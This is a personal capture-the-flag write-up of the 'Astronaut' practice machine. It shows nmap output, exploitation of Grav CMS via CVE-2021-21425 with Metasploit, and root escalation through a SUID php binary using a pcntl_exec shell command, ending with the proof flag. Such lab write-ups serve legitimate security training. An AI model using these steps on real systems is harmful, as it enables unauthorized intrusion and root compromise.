> Noamro08 - 1 March 2024
### Target: 192.168.233.12
---
### Enumeration:
nmap scan - services + default scripts, Top-1000-Ports
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/Astronaut]
└─$ nmap -Pn -n -A 192.168.233.12 -oN inital.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-01 21:56 IST
Nmap scan report for 192.168.233.12
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80:
with wappalyzer we can see grav admin runs grav cms:
and we find this exploit, blog that explains how to exploit it "https://github.com/CsEnox/CVE-2021-21425"
i choose the way with metasploit, enter the regular options and change the target uri to /grav-admin:
![[Pasted image 20240301224320.png]]
we get shell

### Privesc
now from linpeas we can see that there is wierd suid "php":
![[Pasted image 20240301225317.png]]

and in [gtfobins](https://gtfobins.github.io/gtfobins/php/#suid) there is privesc to this situation: 
```bash
www-data@gravity:/tmp$ CMD="/bin/sh"
www-data@gravity:/tmp$ ./php -r "pcntl_exec('/bin/sh', ['-p']);"

# whoami
root

# cat /root/proof.txt
ab2ecdce770b74623c088aa5ade621d2
```